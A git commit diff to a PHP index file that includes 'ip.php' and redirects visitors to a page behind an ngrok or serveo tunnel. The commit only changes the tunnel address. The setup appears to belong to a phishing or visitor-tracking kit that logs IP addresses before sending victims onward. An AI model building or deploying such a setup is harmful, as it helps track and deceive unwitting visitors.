126a542a7fda400f3dae5fe4ae798dc35ec5bd9f
Syed Hisham Akmal <hisham0502@gmail.com>
2023-11-05 16:26:28 +0530

    Extra mods

--- index.php
+++ index.php
@@ -1,5 +1,5 @@
 <?php
 include 'ip.php';
-header('Location: https://a7f4-49-43-241-130.ngrok-free.app/index2.html');
+header('Location: https://1df088a6a8e5afa73fb7b33c0ef506b0.serveo.net/index2.html');
 exit
 ?>
